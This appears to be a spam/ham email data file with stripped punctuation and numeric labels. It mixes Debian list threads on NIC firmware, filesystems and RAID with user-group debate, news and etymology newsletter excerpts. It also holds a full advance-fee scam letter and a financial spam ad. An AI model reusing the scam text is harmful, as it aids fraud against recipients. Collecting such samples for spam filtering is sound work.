Re  Realtek ethernet  was Re  recent mobo recommendation Ron Johnson put forth on                 PM       Nothing I ve seen in dmesg has ever led me to think that the r        driver in my Sid linux source        kernel  yes  it s old      and       fail to build  loads a blob     Almost all NICs load firmware blobs   It s in dmesg somewhere   When the  firmware doesn t load you get something like this in dmesg     eth   RTL    d     d at  xffffc     c e    xx xx xx xx xx xx  XID       c   IRQ     eth   unable to apply firmware patch    That s a paste from one of the OPs here who was bitten by the        trunk  upgrade which IIRC is the one that ripped out the RTL firmware blob     I can t find via Google a dmesg snippet of a successful RTL firmware load   Here s what it looks like for Intel     X using the e    driver  with the  firmware blobs all compiled into the kernel     e             d    firmware  using built in firmware e    d   m_ucode bin     built in  signifies that the firmware blob has been included in the kernel  at compile time   I do this to avoid issues such as this RTL problem   It  only adds a couple hundred K to the kernel image   And I use the vanilla  kernel org sources to avoid any Debian  non free  issues     Just about every NIC on the planet uses a firmware blob   There are  IIRC     ways to load the device firmware into the Linux kernel   This applies to all  devices that require soft firmware  not just NICs         Compile all device firmware blobs into the kernel      Compile the individual blob into the driver  use initrd      Put firmware file in root filesystem  tell kernel the path       won t work with drivers that are needed during the boot process such as  block device drivers   Those require method   or     NICs should be able to  use         There are   different dmesg statements and   different errors depending on  which method     above that you re using        At least a couple of people on this list went out and bought     non RealTek PCI     NICs to fix the problem instead of reverting to the older kernel         I sort of remember that     Yeah  I just pulled the mails   One upgraded to        trunk on his  firewall  bricking it until he disabled the onboard RTL and installed an  Intel e    IIRC   They thought it was a udev issue til I noticed the  firmware load failure message referenced up above in this email   The other  had an RTL wireless that failed for the same reason   I can t recall how  they fixed that one   IIRC the OP didn t swap hardware to achieve the fix   so they did something with the kernel driver firmware       I m not surprised   Since I m only connected to a small    Mbps LAN    which then connects to a   Mbps cable modem  it doesn t really affect me     Do some FTP or SCP tests back and forth to another LAN machine and see what  transfers rates you get out of that RTL chip   I bet you get    rd wire  speed at best  about   MB s  if even that   The machines themselves need to  be modern to saturate the link  no slow CPUs or disks   Any   GHz CPU with     MB RAM and a decent    K RPM SATA disk should be able to push pull   MB s  across the wire   For that matter  eliminate the disk by creating a    MB  RAM disk on each machine   Create a test file with dd and FTP SCP it back  and forth between the RAM disks   If your RTL chip can peak the wire it ll  be a     second transfer if your network chips and Linux TCP stacks are up  to the task       Maybe if I ever get     or     I ll squeal in anger   Until then       It s looking like the RTL firmware blob issue may have been limited to the  trunk kernel   You may get lucky   Then again  if you roll your own and put  the firmware blobs in the kernel itself as I do  you shouldn t have a  problem   That is  if the Debian kernel source doesn t have the blob ripped  out for being  non free      You mentioned you had problems building        and     kernel source   Do  you use the Debian kernel source or kernel org source   I ve been using the  kernel org source for quite some time and have never had any real problems  with it  knocks on wood    I had a build problem with     a while back but  that turned out to be due to a slight bit too much overclock on my machine  in this warmer weather              Stan           To UNSUBSCRIBE  email to debian user REQUEST lists debian org   with a subject of  unsubscribe   Trouble  Contact listmaster lists debian org  Archive  http   lists debian org  BC    E         hardwarefreak com      ,1

Re  Filesystem recommendationsFrom nobody Wed Mar                  Content Type  Text Plain     charset  iso          Content Transfer Encoding  quoted printable  On Thursday    April               Joe Brenner wrote     Ron Johnson  wrote       B  Alexander wrote         Ron Johnson  wrote          XFS is the canonical fs for when you have lots of Big Files   I ve         also seen simple benchmarks on this list showing that it s faster         than ext  ext                 Thats cool  What about Lots of Little Files  That was another of the        draws of reiser             That same unofficial benchmark showed surprising small file speed by      xfs           Would you happen to have any links to such benchmarks  unofficial or    otherwise           My experience has been that whenever I look at filesystem benchmarks     they skip the many small files case   I ve always had the feeling that    most of the big filesystems cared a lot about scaling up in file size     but not too much about anything else     NB  This is my best recollection  I m not looking this up right now   Pleas   e     check my facts  I d love to know if I m wrong     Some of that reiserfs performance came from directories as hash tables  whi   ch     I believe ext    supports and is native for btrfs   Some of that also came        from tail packing  which could come from the extents feature of ext  and     should be in btrfs   The final edge reiserfs had was above average     flushing caching algorithms  and the development pushes in ext  and btrfs h   ave     likely reduced or eliminated that  I think the unified block device caching        system in the kernel able helped make that not such a big deal       I m a Reiser  user myself  and I ve never had any problems with it            The trouble with it being  long in the tooth  is mostly hypothetical     isn t it      Not really   Reiserfs will probably be maintained in the kernel for a very        long time  in that as any interfaces it uses are updated it will be updated    to     use the new interface   However  ISTR there are open bugs on reiserfs that        will not be fixed   Similarly  I expect new bugs that can be blamed on the        reiserfs code are less likely to be fixed than bugs than can be blamed on t   he     ext      or xfs code     In addition  as file system technology advances  reiserfs will become less        attractive for new installs and it will become more attractive to migrate a   way     from it   Unfortunately  migration tools are unlikely to be developed  outs   ide     of generic file system migration tools   Compare with btrfs_convert which     allows an ext    file system to be converted to btrfs with no data copying         such tools have to be aware of the internal structure of the file system an   d     fewer and fewer developers will even HAVE that knowledge of reiserfs   The        source will be available  sure  but even kernel maintainers interested in f   ile     systems are not interested in reiserfs     There s no drop dead date for reiserfs in the kernel  AFAIK   so there s no        pressing need to migrate away from it  but there is a lot of work on file     systems that should both perform better and be supported better than reiser   fs     D      Boyd Stephen Smith Jr                 D   _     D   bss iguanasuicide net               _  o o \_    ICQ         YM AIM  DaTwinkDaddy   `       `    http   iguanasuicide net               \_   ,1

Apple   User Groups  was Re  AUGD  Re  PR Mailing Lists This discussion has drifted far  far away from initial subject of PR    Mailing Lists  so it about time we changed subject  and yes I probably    should have done it last time I replied to this thread     On             at      AM  Chris Hart wrote     ___ John Feltham at  wrote  ___        G day Chris          On             at      PM  Chris Hart wrote           See  that s downright disgusting that Apple won t even acknowledge      our existence          While I agree that their position is not good  I think that you       have to think     that their business is the manufacture and sale of their products        I m not asking them to promote our groups prominently   I just want      them to    publicly acknowledge our existence in a proud fashion and not      hesitate to    mention us to their customers when appropriate     When is an  appropriate  time     And how do Apple decide which User Groups to  acknowledge in a proud    fashion   There are groups out there that only have a dozen or so members     Others seem to a large portion of members still using PowerPC based    machines  And from my experience  it seems very few  traditional  user    groups actually cater for the demographic that Apple is now chasing            Once in the     first year of their existence  once in the second   The attitude       towards us     during the second visit was not as good as the first   Despite the       fact that     our group was the ideal audience and perfectly behaved during both       visits      not that that s ever an issue with our group  but I wanted to make       it clear     that I saw no reason for the attitude         What makes your group  an ideal audience    I m suggesting that you aren t    In fact  I am curious to see how ALL    User Groups feel about this point   Are User Groups in fact the  ideal audience  for Apple  Or would Apple    just be preaching to the converted        finding a place to hold your meetings is just a function of that       task  They     are your meetings  no one elses        The store had indicated that they would provide the    program presentation presenter   Are we supposed to come up with a      backup    presentation and presenter for every meeting we plan  in case the      meeting    falls through   Not really gonna happen and I doubt any user groups      do that     except for occasions where they have reason to believe an out of town    presenter s appearance could fall through      Over at my own website  I recently highlighted a series of posts from    O Reilly on how to deal with Speaker Cancelations  http   www appleusers org share oreilly share how to deal with speaker cancelations     EVERY group I have ever known has had to deal with this one time or    another    I ve been in the situation where I ve had to find a last    minute replacement OR usually BE the last minute replacement  Yes it    is embarrassing  but these things do unfortunately happen     I ve even been known to be the cause of such cancelations to groups    myself     Often I m booked month s in advance to present to a group    then    circumstances change and I have to cancel   Other times  I ve had initial discussions about presenting  again    months in advance  and then I hear nothing until the night before the    presentation    asking if am I still OK with  tomorrow         ^     ^  Q   is all I can say     There are plenty of ways of gently reminding a presenter that they    have a presentation coming up soon    and harking back to the original    topic of this thread    a forwarding of a Press Release you ve sent    out a month before the meeting that mentions the  forthcoming meeting    next month  is one simple way of doing so  It also shows that you care    enough about the topic presenter to promote it          That really annoyed we board members  because we were made to look       like     idiots and our general membership was highly disappointed   We       swore that we     would never do anything involving that store ever again             So far everything that you have written about has ha a negative       approach     slant        Everything about the situation was negative   I don t see any point in    putting a smiley face on it        The only positive that came about was for the board to swear we will      never    rely on that store again   We now have the freedom of not relying on      such    careless individuals for the focus of one of our meetings     How much communication did you have with the Store leading up to the     presentation    Surely  you weren t discussing things even the week before the meeting    and they still just let you turn up    I know of instances where User Groups have made plans with Apple    Retail Stores            about our     groups     is centered around furthering the usefulness of Apple products   We       provide     a positive  family friendly  intelligent resource to Mac users         How is that     not something to let the world know about             I agree  But then I say  get out and bang the drum  do we really       need Apple        Yes  we really do        Increasingly  the average owner user of Apple products thinks that      the local    Apple Store is the one and only place for to further the Apple      experience     In many cases  it is the best place for many people   I hate to say it  but I cringe at some of the comments I see on User    Group mailing lists etc about what a product may or may not do and how    wrong those responses are   An example I ve seen twice on different lists in recent weeks is the    point about iPads and if they are  locked  to AT T    for starters    both people inquiring were talking about iPads with WiFi only   so    automatically there is no need to even mention been locked in to    AT T   Secondly  both groups were located in Australia and whilst one    was talking about importing an iPad from the US  the other was asking    if they could use it in the UK when they visited family there later in    the year   Steve Jobs made it abundantly clear in his Keynote speech launching    the iPad that it was NOT locked to any carrier    yet on both MUG    lists  people responded saying the iPad was likely to be locked in to    AT T and so the people inquiring would not be able to use the iPad as    they had hoped    which was just plain wrong     Now  I not saying that User Groups always get it wrong    more often    then not they don t and they do actually provide an independent    viewpoint    for example  the discussion on this very list about how    best to demo an iPad was very enlightening and provided far more    information on the topic then I got out of my contacts at Apple    Australian  and Apple US  on how do do the same thing when the iPhone    first came out here  about    months AFTER the US go it   so it wasn t    exactly the latest news then and I m sure others had similar queries    at  the time        The message of user groups is lost in the scale of the Apple media      presence     Then it is up to User Groups to address that themselves     which    again harks back to the original topic of this thread    Here in Australia  we have taken steps towards addressing this    I    produced a full page flyer promoting active Apple User Groups here     See Page    of the Feb Mar issue of the AppleUsers Spotlight  a        page digital format magazine I publish here in Australia  for an    example of the ad   http   www appleusers org magazine february      issue of appleusers spotlight now available     The  electronic  copy of the flyer has each user group name as an    active hyperlink  so people can jump straight to a group in their state   If it appeared in a printed magazine or flyer  then there is still the    simple URL that can easily be typed in which lands you at a page with    links to the various groups own webpages     The  primary  URL used on the flyer was actually put to a vote and    everyone agreed that we wouldn t use the www apple com au usergroup    link  or even the www apple com au usergroup one  as quite a few of    the  active  groups here have chosen NOT to be listed there   so they    can be seen as been independent from Apple  and any other retailer     and also due to the fact that listing often falls out of date       I just realised that the ad needs updating   we don t mention the iPad    in the current version       We also have a portrait version on hand if we need it    in fact  the    flyer started out as an A  size portrait flyer when we were approached    to have an ad in one of Australian Macworld s Super Guide publications      unfortunately we couldn t arrange enough funding to go ahead with    the idea in the time frame at hand    but now we have a solid basis to    work from the next time an opportunity presents itself    There is nothing stopping a group of User Groups in a  state       region  or  area  from getting together and producing their own    version of such an ad     I also love what Mac Users UK have done with their Google map showing    the location of each User Group in the UK  and Ireland   http   www macusersuk org mugs mugsmap php  I really must work out how    to create such a Map for Australian User Groups           Let me make an analogy     At music fairs like Lollapalooza and      Lilith Fair     there are secondary stages where lots of great musicians and groups      get    major exposure   They re not getting the limelight  but they sure      get in    front of lots of people they wouldn t otherwise        Not only do we not get secondary stage placement  but we can t even      hang out    at the gate to the event and have a banner or people handing out      flyers    about our groups     Actually  most  concerts  and major events organisers discourage     hawkers  from  hassling  people at the gates entrance    but they ll    quite happily take your groups money and let you have a concession    stand near by  and usually take a percentage of your gross takings as    well     And why should Apple be expected do the marketing for independent User    Groups     Yes  I know User Groups  promote  Apple products    but we have chosen    to do so    we aren t compelled to do so   We come together in User Groups  or even in online communities such as    this  to meet with like minded people and discuss things about a    common topic of interest to us    just like there are groups that get    together as book clubs  or reptile keepers  even  gunzels  get    together through their common interest in trains  real ones and model    ones    No one makes them form these groups nor force people to    participate

Fw  The Gold BuddhaIn       a monastery in Thailand was being relocated and a group of monks was put in charge of moving a giant clay Buddha  In the midst of the move one of the monks noticed a crack in the Buddha  Concerned about damaging the idol  the monks decided to wait for a day before continuing with their task  When night came  one of the monks came to check on the giant statue  He shined his flashlight over the entire Buddha  When he reached the crack he saw something reflected back at him  The monk  his curiosity aroused  got a hammer and a chisel and began chipping away at the clay Buddha  As he knocked off piece after piece of clay  the Buddha got brighter and brighter  After hours of work  the monk looked up in amazement to see standing before him a huge solid gold Buddha   Many historians believe the Buddha had been covered with clay by Thai monks several hundred years earlier before an attack by the Burmese army  They covered the Buddha to keep it from being stolen  In the attack all the monks were killed  so it wasn t until       when the monks were moving the giant statue  that the great treasure was discovered  Like the Buddha  our outer shell protects us from the word  our real treasure is hidden within  We human beings unconsciously hide our inner gold under a layer of clay  All we need to do to uncover our gold is to have the courage to chip away at our outer shell  piece by piece   Could you be sitting on your own gold mine  Did you know the average American can retire a millionaire on his or her current income  Then  why don t they  It s simple  They haven t been taught that they could  They are taught to use debt to get what they want now instead of having their money work for them  They pay too much in taxes  They are wasting money every month and don t even realize it  In short  they are financially unhealthy  Get a financial checkup and a free video on how to become  Financially Fit For Life  and discover the gold within your current income   Get your FREE   Point Checkup and Video Now  http                   finfit checkup html                                                                                To unsubscribe  email removeme speededelivery com with the subject  Remove    SpeedeDelivery   Jordan Commons Tower       South     East Sandy  UT                                                                                       ,0

RE  Hanson s Sept    message in the National Review   Chuck Murcko wrote        Heh  ten years ago saying the exact same words was most definitely not      parroting the party line           It was even less so thirty years ago  My story remains the same  take     it or leave it  I ve said the same words to white supremacists as to     suburban leftist punks as to homeys as to French Irish  etc  etc           I don t have to agree with anything you say  I  am  obligated to     defend to the death your right to say it  I don t give a rat s ass     where you say it  even in France  I don t care where the political     pendulum has swung currently          Chuck       I had to laugh at Rumsfield yesterday   when he was heckled by   protestors  he said something like  They couldn t do that in Iraq     Meanwhile  from what I could tell  the protestors were being arrested      Owen  Trying to shoutdown a speaker or being loud and rowdy while someone else is trying to speak  in the vernacular   getting in their face   is rude and disrespectful   And persistently getting in someones face is assault  a criminal offense  If these people have something to say  they can say it with signs or get their own venue   And here is something else to chew on    these protesters are NOT interested in changing anyones mind about what Rumsfield is saying  How likely are you to change someone s mind by being rude and disrespectful to them  Is this how to win friends and influence people  Either these folks are social misfits who have no understanding of human interactions  else they would try more constructive means to get their message across  or they are just out to get their rocks off regardless of how it affects other people  and that is immoral at best and downright evil at worst   Bill   ,1

[ILUG] semaphores on linux RH   Hi All   I have a question which is a bit tricky and was wondering of anyone has come across this problem before or could point me in the right direction   I am involved in porting a SCO unix application to Linux  and we have encountered a problem with the way semaphores  are being handled  The application uses mulitple processes to run application code with the main process known as the bsh which controls all i o be it screen  or file i o  syncronisation is handled via semaphores   In certain circumstances the main process and the application child process seem to lock up both waiting for the syncronisation semaphores to change state  I have attached ddd to the processes and it seems that the semaphore code is doing the correct things for syncronisation but the processes stay stuck in the semop   system call   I have also noticed that if I introduce a slight delay between changing semaphore states the problem goes away  but this causes our entire application to run really sloooww    lol  Is there anything weird or different with the standard implemenation of semaphores on modern linux that could cause a semop   to fail to pick up the change in state  in a semaphore immediately   Setting sem_flg   IPC_NOWAIT and checking for errno    EAGAIN and recalling semop   if the semop   call fails      also fixes the problem but again system performance goes down the toilet   both the parent controlling process run as the same uid  and the parent creates the semaphores with permissions        Any pointers would be appreciated   Rgds   Colin Nevin   __________________________________________________ Do You Yahoo   Everything you ll ever need on one web page from News and Sport to Email and Music Charts http   uk my yahoo com      Irish Linux Users  Group  ilug linux ie http   www linux ie mailman listinfo ilug for  un subscription information  List maintainer  listmaster linux ie   ,1

High Altitude Ramboshttp   www nytimes com            opinion   HERB html todaysheadlines  pagewanted print position top   The New York Times September          High Altitude Rambos By BOB HERBERT  Dr  Bob Rajcoomar  a U S  citizen and former military physician from Lake Worth  Fla   found himself handcuffed and taken into custody last month in one of the many episodes of hysteria to erupt on board airliners in the U S  since the Sept     attacks   Dr  Rajcoomar was seated in first class on a Delta Airlines flight from Atlanta to Philadelphia on Aug     when a passenger in the coach section began behaving erratically  The passenger  Steven Feuer  had nothing to do with Dr  Rajcoomar   Two U S  air marshals got up from their seats in first class and moved back to coach to confront Mr  Feuer  who was described by witnesses as a slight man who seemed disoriented  What ensued was terrifying  When Mr  Feuer refused to remain in his seat  the marshals reacted as if they were trying out for the lead roles in Hollywood s latest action extravaganza   They handcuffed Mr  Feuer  hustled him into first class and restrained him in a seat next to Dr  Rajcoomar  The     or so passengers were now quite jittery  Dr  Rajcoomar asked to have his seat changed and a flight attendant obliged  finding him another seat in first class  The incident  already scary  could   and should   have ended there  But the marshals were not ready to let things quiet down   One of the marshals pulled a gun and brandished it at the passengers  The marshals loudly demanded that all passengers remain in their seats  and remain still  They barked a series of orders  No one should stand for any reason  Arms and legs should not extend into the aisles  No one should try to visit the restroom  The message could not have been clearer  anyone who disobeyed the marshals was in danger of being shot   The passengers were petrified  with most believing that there were terrorists on the plane    I was afraid there was going to be a gun battle in that pressurized cabin   said Senior Judge James A  Lineberger of the Philadelphia Court of Common Pleas  a veteran of    years in the military  who was sitting in an aisle seat in coach   I was afraid that I was going to die from the gunfire in a shootout    Dr  Rajcoomar s wife  Dorothy  who was seated quite a distance from her husband  said   It was really like Rambo in the air   She worried that there might be people on the plane who did not speak English  and therefore did not understand the marshals  orders  If someone got up to go to the bathroom  he or she might be shot   There were no terrorists on board  There was no threat of any kind  When the plane landed about half an hour later  Mr  Feuer was taken into custody  And then  shockingly  so was Dr  Rajcoomar  The air marshals grabbed the doctor from behind  handcuffed him and  for no good reason that anyone has been able to give  hauled him to an airport police station where he was thrown into a filthy cell   This was airline security gone berserk  No one ever suggested that Dr  Rajcoomar  a straight arrow retired Army major  had done anything wrong   Dr  Rajcoomar  who is of Indian descent  said he believes he was taken into custody solely because of his brown skin  He was held for three frightening hours and then released without being charged  Mr  Feuer was also released   Officials tried to conceal the names of the marshals  but they were eventually identified by a Philadelphia Inquirer reporter as Shawn B  McCullers and Samuel Mumma of the Transportation Security Administration  which is part of the U S  Transportation Department   The Transportation Security Administration has declined to discuss the incident in detail  A spokesman offered the absurd explanation that Dr  Rajcoomar was detained because he had watched the unfolding incident  too closely    If that becomes a criterion for arrest in the U S   a lot of us reporters are headed for jail   Dr  Rajcoomar told me yesterday that he remains shaken by the episode   I had never been treated like that in my life   he said   I was afraid that I was about to be beaten up or killed    Lawyers for the American Civil Liberties Union have taken up his case and he has filed notice that he may sue the federal government for unlawful detention    We have to take a look at what we re doing in the name of security   said Dr  Rajcoomar   So many men and women have fought and died for freedom in this great country  and now we are in danger of ruining that in the name of security                          R  A  Hettinga  The Internet Bearer Underwriting Corporation     Farquhar Street  Boston  MA       USA      however it may deserve respect for its usefulness and antiquity  [predicting the end of the world] has not been found agreeable to experience      Edward Gibbon   Decline and Fall of the Roman Empire    ,1

that variations on it and other ways of saying  head over heels  are widely known  especially  ass over appetite  from the US  where  appetite  may be a transferred term for the mouth  But the specific form that Maria Jessup Robinson was asking about   appetite over tin cup   seems not to be known much at all  It would seem to be a conflation of the British expression  arse over teakettle  and the American  ass over appetite   note my deliberate use of the two spellings of  arse  here    The saying was probably modified because at the time it was created a tea kettle was an item less common in America than in Britain  Even in Britain these days it is obsolete as a fixed term except within this expression  which itself is now not very common   BUMBERSHOOT  Several subscribers have

same way as  picnic    In the early years of the twentieth century the German psychiatrist Ernst Kretschmer examined criminals to try to tie their physical shape and constitution to their personalities and mental illnesses  Tall and thin ones he called  asthenic   or  leptosomic   and considered them to be the sort that commits fraud and petty theft  A second set were athletic types with well developed muscles  whom he concluded  unsurprisingly  were more likely to be violent  The third sort were the  pyknic  ones  who seemed to be a mixture of the other two kinds so far as their criminal tendencies were concerned  He took  pyknic  from Greek  puknos   thick or close  packed  it appeared first in his book  K rperbau und Charakter   Physique and Character  in       from where it soon moved into English   The American psychologist William Sheldon built on and modified Kretschmer s ideas  coming up with the three terms to describe body types    endomorph    mesomorph  and  ectomorph    that are now more common  He considered Kretschmer s pyknic type to be a mixture of the endomorph  with a soft round body tending to put on fat  the Santa Claus type  and the mesomorph  with a compact  powerful  and athletic body tending to the Tarzan or Mr Universe type  and came up with the phrase  pyknic practical joke  to describe a person who is muscular in early life but who later goes pear shaped and balloons out into obesity       Q A                                                                     Q  A friend and I were reading a recent article in the  New York Times  that made mention of a  mash note   I had never heard this term before  but I extrapolated that it is some sort of love note  Is there a more specific meaning than a simple love note  And can you give some insight as to the origin of the term  [Jane Rosenthal  California]  A  You re right about the meaning of the phrase   We have to go back some way to find the origin  The first form was the word  mash  by itself  This was a slang term in the US in the     s for an infatuation or crush  a magazine in      defined it as  a deep but fleeting affection of the heart    A  mash  could also be a dandy or the object of one s affection  of either sex  or   as a verb   to make amorous advances to a member of the opposite sex  to flirt or seduce  A  masher  was a man who thought himself irresistible to the female sex but whose advances were often unwelcome   The evidence collected by Professor Lighter in the  Random House Historical Dictionary of American Slang  and by others suggests that it was originally a term used in and around the theatre  Charles Godfrey Leland  best known for his  Hans Breitmann s Ballads  about a German immigrant  wrote a note above his poem   The Masher   dated about       confirming this     The word to  mash   in the sense of causing love or   attracting by a glance or fascinating look  came into   ordinary slang from the American stage  Thus an actress   was often fined for  mashing  or smiling at men in the   audience    Mash  and its derivatives crossed the Atlantic to Britain about        Masher  in particular became a term in London society  especially among the more raffish supper club and theatre going classes  for a type of fashionable male  The Oxford English Dictionary defines it  with a distinctly maidenly air of drawing away its collective skirts  as  a fop of affected manners and exaggerated style of dress who frequented music halls and fashionable promenades and who posed as a  lady killer    noting that the word had been common  in      and for a few years after   In a letter from London in the old  Overland Monthly and Out West Magazine  in       a correspondent described a member of an impoverished theatrical company   This dashing youth was distinctly conscious of his fascinations for the buxom maids who sighed beside us  and the airy and elegant nonchalance of the glances that superbly took them in would be a lesson for champion  mashers  of a far higher class    A  mash note   in its first appearances   mash letter   was an obvious enough extension  a love letter  It is recorded first in      and   as you have discovered   is still doing well   Where  mash  and its relatives come from has been a subject of debate  It is sometimes said that it is from the standard English word meaning to make soft by one of various means  with its obvious reference to rendering the object of one s attentions pliable and yielding  Max Beerbohm  writing in London in       mashers were still around then  despite the OED s comment  remarked that some people derived it from  Ma Ch re    the mode of address used by the gilded youth to the barmaids of the period   But he thought it really came from  the chorus of a song  which  at that time  had a great vogue in the music halls   I m the slashing  dashing  mashing Montmorency of the day    We re pretty sure now that he was wrong  but he could hardly know that   Back to Charles Leland again  Apart from his humorous writings  he also researched and wrote a great deal about the Romany language as well as Gypsy songs and customs  The following note from the introduction to the poem gives an origin that is now widely accepted     It was introduced by the well known gypsy family of actors    C   among whom Romany was habitually spoken  The word    masher  or  mash  means in that tongue to allure  delude    or entice  It was doubtless much aided in its popularity by   its quasi identity with the English word  But there can be   no doubt as to the gypsy origin of  mash  as used on the   stage  I am indebted for this information to the late well    known impresario Palmer of New York  and I made a note of   it years before the term had become at all popular   Though defunct in British English   mash  and  masher  have never quite gone away in America   Mash  had a resurgence of popularity as student slang in the     s in the sense of necking or petting  though that may be a back formation from  mash note        Endnote                                                                      A Spanish lady asked an

Strictly Private Gooday   With warm heart my friend  I send you my greetings  and I hope this letter meets you in good time    It will be surprising  to you to receive this proposal from me since you do not know me personally  However  I am sincerely seeking your confidence in this transaction  which I propose with my free mind and as a person of intergrity  I have kept it to myself for a long time  and now I need to act  as time is not on my side  I want you to open heartedly read through and give me your most needed support  I got your address from an internet directory  in my search for a contact  I apologize if this is not acceptable to you  The purpose of this letter is to seek your most needed assistance    My name is Donald Phiri  the farm supervisor and personal assistant to Mr  David Stevens  a very popular and rich farmer from Macheke  Zimbabwe  My master was murdered in cold blood in my presence on    of April       due to the land dispute and political situation in my country  as a result of my master s financial support for the MDC  Movement for Democratic Change   the main opposition party to President Mugabe s party   Zimbabwe African National Union Patriotic Front  ZANU PF    For more information on my master s murder  you may check the Amnesty International Country Report on Zimbabwe for the year        When the pressure on white farmers started in Zimbabwe due to the support given to the war veterans by President Mugabe to invade farms and force out white farmers  my master forsaw the danger ahead  he then closed his major bank accounts  and together  we went to Johannesburg  South Africa to deposit the sum of       million  Fourten million  five hundred thousand USdollars   in a private security company  for safety  This money was deposited in a box in my name  as my master was being secretive with his name  as the South African government of Thambo Mbeki is in support of President Mugabe s actions  The box is labeled as gemstones  My master had planned to use this money  for the purchase of lands  new machines and chemicals for establishment of new farms in Botswana  He has used this company in the past to move money for the purchase of tractors and farm equipment from Europe  My master is divorced  and his wife Valerie  and only child  Diana have relocated to Bradford     En  gland for  years now    I am currently in the Netherlands where I am seeking political asylum  I have now decided to transfer my  master s  money into an account for security and safety reasons  This is why I am anxiously and humbly seeking for your genuine assistance in transfering this money into an account without the knowledge of my government who are bent on taking everything my master left  You have to understand that this decision taken by me entrusts so much to you   If you accept to assist me  all I want you to do for me  is to make an arrangements with the security company to clear the box containing the money from their office here in the Netherlands  and then we will transfer the money into an account  You may open a new account for this purpose  I have applied to the security company to transfer the box from South Africa to their branch here  which they have done    To legally process the claim of the box  I will contact a lawyer to help me prepare a change of ownership and letter of authority to enable them recognise you as my representative  and deliver the box to you  I have with me  the certificate used to deposit the box  which we will need for claiming the box    For valuable assistance  I am offering you                 of the total money  I have also set aside              of this money for all kinds of expenses that come our way in the process of this transaction  and               will be given to Charity in my master s name I will give                  to Valerie and Diana  after my share of the money has been transfered back to me  When they grant my asylum application  my share of the money        will be transfered back to me  into an account I will solely own  I also intend to start up a business then  If you have knowledge of farming business in your country  or other areas of possible business investment that I may be interested in  please inform me  so that my some of my share of the money can be invested for the time being   Please  I want to you maintain absolute secrecy for the purpose of this transaction due to my safety and successful conclusion of the transaction    I look forward to your reply and co operation  and I am sure it will be nice to extend ties with you   Yours sincerely  Donald Phiri           DeathToSpamDeathToSpamDeathToSpam                                                             This sf net

Re  Questions about RAID  Disclaimer   I m partial to XFS    Tim Clewlow put forth on               AM       My reticence to use ext    xfs has been due to long cache before    write times being claimed as dangerous in the event of kernel lockup      power outage      This is a problem with the Linux buffer cache implementation  not any one  filesystem   The problem isn t the code itself  but the fact it is a trade  off between performance and data integrity   No journaling filesystem will  prevent the loss of data in the Linux buffer cache when the machine crashes    What they will do is zero out or delete any files that were not fully  written before the crash in order to keep the FS in a consistent state   You  will always lose data that s in flight  but your FS won t get corrupted due  to the journal replay after reboot   If you are seriously concerned about  loss of write data that is in the buffer cache when the system crashes  you  should mount your filesystems with   o sync  in the fstab options so all  writes get flushed to disk without being queued in the buffer cache       There are also reports  albeit perhaps somewhat    dated  that ext  xfs still have a few small but important bugs to be    ironed out   I d be very happy to hear if people have experience    demonstrating this is no longer true  My preference would be ext     instead of xfs as I believe  just my opinion  this is most likely to    become the successor to ext  in the future     I can t speak well to EXT   but XFS has been fully production quality for  many years  since      on Irix when it was introduced  and since       on  Linux   There was a bug identified that resulted in fs inconsistency after a  crash which was fixed in        All bug fix work since has dealt with minor  issues unrelated to data integrity   Most of the code fix work for quite  some time now has been cleanup work  optimizations  and writing better  documentation   Reading the posts to the XFS mailing list is very  informative as to the quality and performance of the code   XFS has some  really sharp devs   Most are current or former SGI engineers       I have been wanting to know if ext  can handle    TB fs   I now know    that delayed allocation   writes can be turned off in ext   among    other tuning options I m looking at   and with ext   fs sizes are no    longer a question  So I m really hoping that ext  is the way I can    go     XFS has even more tuning options than EXT   pretty much every FS for that  matter   With XFS on a    bit kernel the max FS and file size is   TB   On a     bit kernel it is   exabytes each   XFS is a better solution than EXT  at  this point   Ted T so admits last week that one function call in EXT  is in  terrible shape and will a lot of work to fix      On my todo list is to fix ext  to not call write_cache_pages   at all   We are seriously abusing that function ATM  since we re not actually  writing the pages when we call write_cache_pages     I won t go into  what we re doing  because it s too embarassing  but suffice it to say  that we end up calling pagevec_lookup   or pagevec_lookup_tag     four   count them  four  times while trying to do writeback     I have a simple patch that gives ext  our own copy of  write_cache_pages    and then simplifies it a lot  and fixes a bunch  of problems  but then I discarded it in favor of fundamentally redoing  how we do writeback at all  but it s going to take a while to get  things completely right   But I am working to try to fix this        I m also hoping that a cpu motherboard with suitable grunt and fsb    bandwidth could reduce performance problems with software raid   If    I m seriously mistaken then I d love to know beforehand  My    reticence to use hw raid is that it seems like adding one more point    of possible failure  but I could be easily be paranoid in dismissing    it for that reason     Good hardware RAID cards are really nice and give you some features you  can t really get with md raid such as true  just yank the drive tray out   hot swap capability   I ve not tried it  but I ve read that md raid doesn t  like it when you just yank an active drive   Fault LED drive  audible  warnings  are also nice with HW RAID solutions   The other main advantage is  performance   Decent HW RAID is almost always faster than md raid  sometimes  by a factor of   or more depending on the disk count and RAID level   Typically good HW RAID really trounces md raid performance at levels such as                basically anything requiring parity calculations     Sounds like you re more of a casual user who needs lots of protected disk  space but not necessarily absolute blazing speed   Linux RAID should be fine     Take a closer look at XFS before making your decision on a FS for this  array   It s got a whole lot to like  and it has features to exactly tune  XFS to your mdadm RAID setup   In fact it s usually automatically done for  you as mkfs xfs queries the block device device driver for stride and width  info  then matches it       man   mkfs xfs     http   oss sgi com projects xfs   http   www xfs org index php XFS_FAQ  http   www debian

a number of reasons including fscking    T of disk is long and  painful  we were hitting various cache issues  and we were seeking better  performance out of our file system       After initial tests looked positive we made the jump  and have been quite  happy with the results  With an instant increase in performance and  throughput  as well as the worst xfs_check we ve ever seen taking

Feedback from my posting about FogBUGZ Setup fell into four     categories   URL  http   www joelonsoftware com news          html Date  Not supplied  Feedback from my posting[ ] about FogBUGZ[ ] Setup fell into four categories      Why make Setup reversable  Instead you should collect all the information  from the user and make all the changes in one batch at the end    There are a  couple of things to understand here  First of all  even if you do everything in  one batch at the end  there s always a possibility that some step in the middle  of the batch will fail  and in that case  a well behaved setup program will  back out the steps that were already done  There are well over     error  messages in the string table for FogBUGZ Setup so the number of things that can  fail is not insignificant    Second  it s not nice to tell people about an error in their input three pages  after they made the mistake  For example  early in the FogBUGZ setup process we  prompt you to create an account for FogBUGZ to use    [IMG  http   www joelonsoftware com pictures setupNewAcct gif  FogBUGZ Setup  Screenshot ]   The account creation could fail for a myriad of reasons  none of which can be  predicted before trying to create the account  For example  the password might  not conform to the system password policy  And different national versions of  Windows NT have different rules about accented letters in passwords  betcha  didn t know that    It s better to tell the user about this problem right away  so they can correct their input rather than having a message come up during the  long install process later  forcing the user to back up and fix it  And 